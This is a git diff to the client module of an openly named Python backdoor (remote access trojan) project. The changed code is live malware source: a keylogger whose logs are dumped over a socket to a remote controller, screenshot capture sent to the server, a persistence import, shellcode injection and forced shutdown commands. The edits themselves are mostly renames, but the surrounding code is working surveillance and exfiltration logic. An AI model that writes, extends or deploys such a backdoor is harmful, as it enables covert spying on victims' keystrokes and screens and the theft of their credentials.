@@ -6,8 +6,10 @@ https://github.com/xp4xbox/Python-Backdoor
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
 import ctypes
+import os
 import socket
 import subprocess
+import sys
 import threading
 import platform
 from io import BytesIO, StringIO
@@ -18,7 +20,7 @@ import wmi
 
 from src import helper, errors
 from src.client import persistence
-from src.defs import *
+from src.command_defs import *
 from src.client.keylogger import Keylogger
 
 
@@ -50,7 +52,7 @@ def get_info():
 class Control:
     def __init__(self, socket):
         self.socket = socket
-        self.logger = Keylogger()
+        self.keylogger = Keylogger()
         self.disabled_processes = {}
 
     # tested on x86 and x64, shellcode must be generated using the same architecture as python interpreter
@@ -145,16 +147,16 @@ class Control:
 
     def keylogger_dump(self):
         try:
-            self.socket.sendall_json(SUCCESS, helper.decode(self.logger.dump_logs().encode()))
+            self.socket.sendall_json(SUCCESS, helper.decode(self.keylogger.dump_logs().encode()))
         except errors.ClientSocket.KeyloggerError as e:
             self.socket.send_json(ERROR, str(e))
 
     def keylogger_start(self):
-        self.logger.start()
+        self.keylogger.start()
 
     def keylogger_stop(self):
         try:
-            self.logger.stop()
+            self.keylogger.stop()
             self.socket.send_json(SUCCESS)
         except errors.ClientSocket.KeyloggerError as e:
             self.socket.send_json(ERROR, str(e))
@@ -165,7 +167,7 @@ class Control:
             image.save(_bytes, format="PNG")
             image_bytes = _bytes.getvalue()
 
-        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, is_bytes=True)
+        self.socket.sendall_json(SERVER_SCREENSHOT, image_bytes, len(image_bytes), is_bytes=True)
 
     def shutdown(self, shutdown_type, timeout):
         command = f"shutdown {shutdown_type} -f -t {str(timeout)}"
